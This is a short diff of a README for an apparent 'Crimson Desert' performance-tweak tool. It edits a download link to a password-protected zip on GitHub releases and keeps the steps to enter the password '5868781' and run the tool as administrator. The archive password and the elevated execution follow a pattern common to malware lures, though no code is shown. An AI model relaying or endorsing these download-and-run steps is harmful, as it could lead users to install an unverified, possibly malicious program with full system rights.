@@ -20,7 +20,7 @@ What it does:
 
 ## ⚙️ How to Use
 
-1. [Download]([Link](https://github.com/chaserturtlesing/CrimsonDesert-Performance-Tweaks/releases/download/Download/Performance-Tweaks.zip))
+1. [Download]([https://github.com/chaserturtlesing/CrimsonDesert-Performance-Tweaks/releases/download/Download/Performance-Tweaks.zip])
 2. PASSWORD (5868781)
 3. Run as administrator.
 4. Choose an option:
